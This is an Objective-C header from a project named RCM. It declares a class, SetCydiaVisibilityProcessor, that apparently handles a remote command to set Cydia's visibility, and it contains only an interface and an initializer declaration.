//
//  SetCydiaVisibilityProcessor.h
//  RCM
//
//  Created by Makara Khloth on 2/26/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "RemoteCmdSyncProcessor.h"

@interface SetCydiaVisibilityProcessor : RemoteCmdSyncProcessor  {

}

//Initialize processor with RemoteCommandData 
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData;

@end
